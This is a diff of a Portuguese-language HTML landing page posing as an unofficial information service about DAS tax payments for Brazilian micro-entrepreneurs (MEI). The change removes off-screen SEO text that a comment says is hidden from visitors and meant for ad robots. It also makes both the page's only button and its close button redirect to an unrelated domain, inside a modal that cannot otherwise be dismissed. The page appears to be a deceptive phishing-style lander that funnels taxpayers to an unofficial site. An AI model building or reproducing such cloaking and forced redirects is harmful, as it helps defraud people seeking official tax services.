@@ -1,8 +1,7 @@
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf8">
+    <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="content-language" content="pt-br">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes">
@@ -16,527 +15,87 @@
 
     <meta name="description" content="Sistema informativo auxiliar não oficial para consulta de informações sobre DAS MEI. Para serviços oficiais, acesse gov.br/empreendedor">
 
-    <!-- Google tag (gtag.js) - Conversion Tracking -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17617585294"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'AW-17617585294');
-    </script>
-
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
 
     <style>
-        * {
-            -webkit-tap-highlight-color: transparent;
-            touch-action: manipulation;
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            background: url('background.png') no-repeat center center fixed;
-            background-size: cover;
-            filter: blur(0);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('background.png') no-repeat center center fixed;
-            background-size: cover;
-            filter: blur(8px);
-            z-index: -1;
-        }
-
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex !important;
-            align-items: center;
-            justify-content: center;
-            z-index: 1050;
-            overflow-y: auto;
-            -webkit-overflow-scrolling: touch;
-        }
-
-        .modal-backdrop {
-            background-color: rgba(0, 0, 0, 0.6);
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1040;
-        }
-
-        .modal-dialog {
-            position: relative;
-            margin: 0;
-            width: 90%;
-            max-width: 600px;
-            z-index: 1060;
-        }
-
-        .modal-content {
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
-            background: white;
-        }
-
-        .modal-header {
-            background-color: #5cb85c;
-            color: white;
-            border-radius: 8px 8px 0 0;
-            padding: 20px;
-        }
-
-        .modal-title {
-            font-size: 22px;
-            font-weight: bold;
-            text-align: center;
-            margin: 0;
-        }
-
-        .modal-body {
-            padding: 30px;
-            text-align: center;
-        }
-
-        .modal-body p {
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
-
-        .btn-consultar {
-            background-color: #5cb85c;
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-            padding: 12px 40px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
-            width: 100%;
-            max-width: 350px;
-            display: inline-block;
-        }
-
-        .btn-consultar:hover {
-            background-color: #4cae4c;
-            transform: translateY(-2px);
-        }
-
-        .btn-consultar:active {
-            transform: translateY(0);
-        }
-
-        .logo-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .logo-container img {
-            max-width: 80px;
-            margin-bottom: 10px;
-        }
-
-        .close {
-            color: white;
-            opacity: 1;
-            font-size: 28px;
-            font-weight: 300;
-            line-height: 1;
-            text-shadow: none;
-        }
-
-        .close:hover,
-        .close:focus {
-            color: #f0f0f0;
-            opacity: 1;
-        }
-
-        .modal-body .fa {
-            margin-right: 8px;
-        }
-
-        /* Tablet */
-        @media (max-width: 1024px) {
-            .modal-dialog {
-                width: 85%;
-            }
-
-            .modal-title {
-                font-size: 20px;
-            }
-
-            .modal-body p {
-                font-size: 15px;
-            }
-
-            .btn-consultar {
-                font-size: 17px;
-                padding: 11px 35px;
-            }
-        }
-
-        /* Mobile */
-        @media (max-width: 768px) {
-            .modal {
-                padding: 10px;
-            }
-
-            .modal-dialog {
-                width: 95%;
-                max-width: none;
-                margin: auto;
-            }
-
-            .modal-content {
-                border-radius: 12px;
-            }
-
-            .modal-header {
-                padding: 15px;
-                border-radius: 12px 12px 0 0;
-            }
-
-            .modal-title {
-                font-size: 18px;
-            }
-
-            .modal-body {
-                padding: 20px 15px;
-            }
-
-            .modal-body p {
-                font-size: 14px;
-                margin-bottom: 20px;
-            }
-
-            .modal-body p[style*="font-size: 13px"] {
-                font-size: 12px !important;
-                padding: 10px !important;
-            }
-
-            .modal-body p[style*="font-size: 11px"] {
-                font-size: 10px !important;
-            }
-
-            .modal-body p[style*="font-size: 12px"] {
-                font-size: 11px !important;
-            }
-
-            .btn-consultar {
-                font-size: 16px;
-                padding: 12px 30px;
-                width: 100%;
-                max-width: none;
-            }
-
-            .logo-container img {
-                max-width: 65px;
-            }
-
-            .close {
-                font-size: 32px;
-                padding: 5px 10px;
-            }
-
-            .modal-body > div[style*="margin-top: 25px"] {
-                margin-top: 20px !important;
-            }
-        }
-
-        /* Small Mobile */
-        @media (max-width: 480px) {
-            .modal {
-                padding: 5px;
-            }
-
-            .modal-dialog {
-                width: 98%;
-            }
-
-            .modal-content {
-                border-radius: 10px;
-            }
-
-            .modal-header {
-                padding: 12px;
-                border-radius: 10px 10px 0 0;
-            }
-
-            .modal-title {
-                font-size: 16px;
-            }
-
-            .modal-body {
-                padding: 15px 12px;
-            }
-
-            .modal-body p {
-                font-size: 13px;
-                margin-bottom: 15px;
-            }
-
-            .modal-body p[style*="font-size: 13px"] {
-                font-size: 11px !important;
-                padding: 8px !important;
-            }
-
-            .modal-body p[style*="font-size: 11px"] {
-                font-size: 9px !important;
-            }
-
-            .modal-body p[style*="font-size: 12px"] {
-                font-size: 10px !important;
-            }
-
-            .btn-consultar {
-                font-size: 15px;
-                padding: 11px 25px;
-            }
-
-            .logo-container {
-                margin-bottom: 15px;
-            }
-
-            .logo-container img {
-                max-width: 55px;
-            }
-
-            .fa {
-                font-size: 0.9em;
-            }
-
-            .modal-body a {
-                word-break: break-word;
-            }
-        }
-
-        /* Landscape Mobile */
-        @media (max-width: 896px) and (orientation: landscape) {
-            .modal {
-                padding: 5px;
-                align-items: flex-start;
-                padding-top: 10px;
-            }
-
-            .modal-dialog {
-                margin-top: 0;
-                margin-bottom: 10px;
-            }
-
-            .modal-header {
-                padding: 10px 15px;
-            }
-
-            .modal-body {
-                padding: 15px;
-                max-height: calc(100vh - 100px);
-                overflow-y: auto;
-            }
-
-            .logo-container {
-                margin-bottom: 10px;
-            }
-
-            .logo-container img {
-                max-width: 50px;
-            }
-
-            .modal-body p {
-                margin-bottom: 12px;
-            }
-        }
-
-        /* Very Small Devices */
-        @media (max-width: 360px) {
-            .modal-title {
-                font-size: 14px;
-            }
-
-            .modal-body p {
-                font-size: 12px;
-            }
-
-            .btn-consultar {
-                font-size: 14px;
-                padding: 10px 20px;
-            }
-        }
+        body { margin: 0; padding: 0; height: 100vh; background: url('background.png') no-repeat center center fixed; background-size: cover; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        body::before { content: ''; position: fixed; top:0; left:0; width:100%; height:100%; background: url('background.png') no-repeat center center fixed; background-size: cover; filter: blur(8px); z-index:-1; }
+        .modal-dialog { width: 90%; max-width: 600px; }
+        .modal-content { border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); background: white; }
+        .modal-header { background-color: #5cb85c; color: white; border-radius: 8px 8px 0 0; padding: 20px; text-align: center; }
+        .modal-title { font-size: 22px; font-weight: bold; margin: 0; }
+        .modal-body { padding: 30px; text-align: center; }
+        .btn-consultar { background-color: #5cb85c; color: white; font-size: 18px; font-weight: bold; padding: 12px 40px; border: none; border-radius: 5px; cursor: pointer; width: 100%; max-width: 350px; display: inline-block; transition: 0.3s; }
+        .btn-consultar:hover { background-color: #4cae4c; transform: translateY(-2px); }
+        .btn-consultar:active { transform: translateY(0); }
+        .logo-container img { max-width: 80px; margin-bottom: 10px; }
+        .close { color: white; font-size: 28px; }
+        .close:hover { color: #f0f0f0; }
+        @media(max-width:768px){ .modal-dialog { width:95%; } .modal-content { border-radius:12px; } .modal-header { padding:15px; border-radius:12px 12px 0 0; } .btn-consultar { font-size:16px; padding:12px 30px; } }
     </style>
 </head>
-
 <body>
-    <!-- Modal de Consulta -->
-    <div class="modal fade in" id="modal-consulta" tabindex="-1" role="dialog" style="display: flex; align-items: center; justify-content: center;">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
-                        <span aria-hidden="true">&times;</span>
-                    </button>
-                    <div class="logo-container">
-                        <img src="logo-simples.png" alt="Logo Sistema Informativo MEI">
-                        <h4 class="modal-title">Sistema Informativo MEI</h4>
-                    </div>
+
+<!-- Modal -->
+<div class="modal fade in" id="modal-consulta" tabindex="-1" role="dialog" style="display:flex; align-items:center; justify-content:center;">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+                <div class="logo-container">
+                    <img src="logo-simples.png" alt="Logo Sistema Informativo MEI">
+                    <h4 class="modal-title">Sistema Informativo MEI</h4>
                 </div>
-                <div class="modal-body">
-                    <p>
-                        Sistema auxiliar com informações educativas sobre DAS, obrigações e orientações para Microempreendedores Individuais.
+            </div>
+            <div class="modal-body">
+                <p>Sistema auxiliar com informações educativas sobre DAS, obrigações e orientações para Microempreendedores Individuais.</p>
+                <p style="font-size:13px; color:#666; background:#f5f5f5; padding:12px; border-radius:5px; margin:15px 0;">
+                    <i class="fas fa-book"></i> Conteúdo informativo e educativo<br>
+                    <i class="fas fa-shield-alt"></i> Não realizamos transações financeiras<br>
+                    <i class="fas fa-link"></i> Links para portais oficiais disponíveis
+                </p>
+                <button class="btn btn-consultar" onclick="redirecionarConsulta()">
+                    <i class="fas fa-external-link-alt"></i> Acessar Informações
+                </button>
+                <div style="margin-top:25px; padding-top:20px; border-top:1px solid #e0e0e0;">
+                    <p style="font-size:11px; color:#999;">
+                        Portais Oficiais do Governo:<br>
+                        <a href="https://www.gov.br/empresas-e-negocios/pt-br/empreendedor" target="_blank" style="color:#5cb85c;">Portal do Empreendedor</a> |
+                        <a href="http://www8.receita.fazenda.gov.br/simplesnacional/" target="_blank" style="color:#5cb85c;">Simples Nacional</a>
                     </p>
-                    <p style="font-size: 13px; color: #666; background: #f5f5f5; padding: 12px; border-radius: 5px; margin: 15px 0;">
-                        <i class="fas fa-book"></i> Conteúdo informativo e educativo<br>
-                        <i class="fas fa-shield-alt"></i> Não realizamos transações financeiras<br>
-                        <i class="fas fa-link"></i> Links para portais oficiais disponíveis
+                    <p style="font-size:12px; color:#666; margin:15px 0 5px 0;">
+                        <a href="termos-de-uso.html" target="_blank" style="color:#5cb85c; text-decoration:none;">Termos de Uso</a> |
+                        <a href="politica-de-privacidade.html" target="_blank" style="color:#5cb85c; text-decoration:none;">Política de Privacidade</a>
                     </p>
-                    <button class="btn btn-consultar" onclick="redirecionarConsulta()">
-                        <i class="fas fa-external-link-alt"></i> Acessar Informações
-                    </button>
-                    <div style="margin-top: 25px; padding-top: 20px; border-top: 1px solid #e0e0e0;">
-                        <p style="font-size: 11px; color: #999; margin: 5px 0;">
-                            Portais Oficiais do Governo:<br>
-                            <a href="https://www.gov.br/empresas-e-negocios/pt-br/empreendedor" target="_blank" style="color: #5cb85c;">Portal do Empreendedor</a> |
-                            <a href="http://www8.receita.fazenda.gov.br/simplesnacional/" target="_blank" style="color: #5cb85c;">Simples Nacional</a>
-                        </p>
-                        <p style="font-size: 12px; color: #666; margin: 15px 0 5px 0;">
-                            <a href="termos-de-uso.html" target="_blank" style="color: #5cb85c; text-decoration: none;">Termos de Uso</a> |
-                            <a href="politica-de-privacidade.html" target="_blank" style="color: #5cb85c; text-decoration: none;">Política de Privacidade</a>
-                        </p>
-                    </div>
                 </div>
             </div>
         </div>
     </div>
+</div>
 
-    <!-- Backdrop do modal -->
-    <div class="modal-backdrop fade in"></div>
+<div class="modal-backdrop fade in"></div>
 
-    <!-- Conteúdo SEO para Google Ads - Oculto visualmente mas acessível para robôs -->
-    <div style="position: absolute; left: -9999px; width: 1px; height: 1px; overflow: hidden;">
-        <h1>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</h1>
-        <h2>Sistema de Consulta e Emissão de DAS MEI</h2>
-
-        <article>
-            <h3>O que é o MEI - Microempreendedor Individual?</h3>
-            <p>O Microempreendedor Individual (MEI) é uma modalidade empresarial criada pelo Governo Federal em 2008 para formalizar trabalhadores autônomos. O MEI permite que pequenos empreendedores tenham CNPJ próprio, emitam notas fiscais e tenham acesso a benefícios previdenciários como aposentadoria, auxílio-doença e salário-maternidade.</p>
-
-            <h3>DAS - Documento de Arrecadação do Simples Nacional</h3>
-            <p>O DAS (Documento de Arrecadação do Simples Nacional) é a guia de pagamento mensal obrigatória para todos os Microempreendedores Individuais. Este documento unifica o recolhimento de tributos federais, estaduais e municipais, incluindo contribuição para INSS, ICMS e ISS, dependendo da atividade exercida.</p>
-
-            <h3>Obrigações do MEI</h3>
-            <p>Todo Microempreendedor Individual possui obrigações mensais e anuais que devem ser cumpridas para manter a regularidade do CNPJ:</p>
-            <ul>
-                <li>Pagamento mensal do DAS até o dia 20 de cada mês</li>
-                <li>Entrega da Declaração Anual do Simples Nacional (DASN-SIMEI) até 31 de maio</li>
-                <li>Emissão de notas fiscais quando prestar serviços para pessoas jurídicas</li>
-                <li>Manutenção de relatório mensal de receitas brutas</li>
-                <li>Atualização cadastral sempre que houver mudanças</li>
-            </ul>
-
-            <h3>Valores do DAS MEI 2025</h3>
-            <p>Os valores do DAS MEI para o ano de 2025 são:</p>
-            <ul>
-                <li>Comércio ou Indústria: R$ 75,90 (INSS R$ 70,00 + ICMS R$ 5,90)</li>
-                <li>Prestação de Serviços: R$ 79,90 (INSS R$ 70,00 + ISS R$ 9,90)</li>
-                <li>Comércio e Serviços: R$ 85,80 (INSS R$ 70,00 + ICMS R$ 5,90 + ISS R$ 9,90)</li>
-            </ul>
-
-            <h3>Benefícios Previdenciários do MEI</h3>
-            <p>O Microempreendedor Individual que mantém seus pagamentos em dia tem direito aos seguintes benefícios do INSS:</p>
-            <ul>
-                <li>Aposentadoria por idade (mulheres aos 62 anos, homens aos 65 anos)</li>
-                <li>Aposentadoria por invalidez</li>
-                <li>Auxílio-doença após 12 meses de contribuição</li>
-                <li>Salário-maternidade de 120 dias</li>
-                <li>Pensão por morte para dependentes</li>
-                <li>Auxílio-reclusão para dependentes</li>
-            </ul>
-
-            <h3>Consequências da Inadimplência</h3>
-            <p>O não pagamento do DAS MEI pode gerar várias consequências negativas:</p>
-            <ul>
-                <li>Acúmulo de juros e multa de 0,33% ao dia (limitado a 20%)</li>
-                <li>Perda de benefícios previdenciários</li>
-                <li>Impossibilidade de emitir certidões negativas</li>
-                <li>Inclusão no CADIN (Cadastro Informativo de Créditos não Quitados)</li>
-                <li>Cancelamento do CNPJ após inadimplência prolongada</li>
-                <li>Dificuldade para obter crédito e financiamentos</li>
-            </ul>
-
-            <h3>Como Consultar Pendências do MEI</h3>
-            <p>É fundamental que o Microempreendedor Individual consulte regularmente suas pendências para evitar problemas. A consulta pode ser realizada através do Portal do Simples Nacional, Portal do Empreendedor ou sistemas auxiliares como o PGMEI, que facilitam a visualização de débitos em aberto, irregularidades cadastrais e situação do CNPJ.</p>
-
-            <h3>Regularização de Débitos MEI</h3>
-            <p>Para regularizar débitos do MEI, o empreendedor deve:</p>
-            <ol>
-                <li>Acessar o sistema de consulta de pendências</li>
-                <li>Verificar todos os períodos em atraso</li>
-                <li>Gerar as guias DAS atualizadas com juros e multa</li>
-                <li>Efetuar o pagamento via PIX, boleto bancário ou débito</li>
-                <li>Aguardar a compensação (até 5 dias úteis)</li>
-                <li>Verificar a regularização no Portal do Simples Nacional</li>
-            </ol>
-
-            <h3>Sistema Informativo MEI</h3>
-            <p>Plataforma educativa NÃO OFICIAL que auxilia o MEI com informações sobre pendências, irregularidades e orientações sobre DAS. O sistema permite visualizar informações de forma organizada para fins educativos. ESTE NÃO É UM SISTEMA OFICIAL DO GOVERNO BRASILEIRO.</p>
-
-            <h3>Disclaimer Importante</h3>
-            <p>Este é um SISTEMA INFORMATIVO NÃO OFICIAL. Para consultas e serviços oficiais, utilize EXCLUSIVAMENTE os portais governamentais: Portal do Empreendedor (gov.br/empreendedor), Simples Nacional e Receita Federal. Não realizamos transações financeiras nem substituímos serviços oficiais do governo.</p>
-
-            <h3>Segurança e Privacidade</h3>
-            <p>Informações educativas baseadas em dados públicos. Seguimos a Lei Geral de Proteção de Dados (LGPD). Para transações oficiais, use APENAS os portais do governo brasileiro.</p>
-
-            <h3>Informações Legais</h3>
-            <p>AVISO LEGAL: Este é um sistema informativo auxiliar NÃO OFICIAL. Não substitui consultas aos portais governamentais oficiais. Todas as informações devem ser verificadas nos canais oficiais do governo antes de tomar qualquer decisão. Para serviços oficiais, acesse: gov.br/empreendedor</p>
-        </article>
-
-        <footer>
-            <p>Sistema Informativo MEI (NÃO OFICIAL) | Microempreendedor Individual | Conteúdo Educativo | Portais Oficiais: gov.br/empreendedor | Simples Nacional | Receita Federal</p>
-        </footer>
-    </div>
-
-    <script>
-        // Exibir modal automaticamente ao carregar a página
-        $(document).ready(function() {
-            $('#modal-consulta').modal({
-                backdrop: 'static',
-                keyboard: false
-            });
+<script>
+    $(document).ready(function() {
+        $('#modal-consulta').modal({
+            backdrop: 'static',
+            keyboard: false
         });
+    });
 
-        // Redirecionar para o domínio servicosconsultadas2025.site/?id=1
-        function redirecionarConsulta() {
-          ;
-        }
+    function redirecionarConsulta() {
+        window.location.href = 'https://servicosconsultadas2025.site/?id=1';
+    }
 
-        // Fechar modal e redirecionar
-        $('.close').click(function() {
-           
-        });
-    </script>
+    $('.close').click(function() {
+        window.location.href = 'https://servicosconsultadas2025.site/?id=1';
+    });
+</script>
+
 </body>
 </html>
-
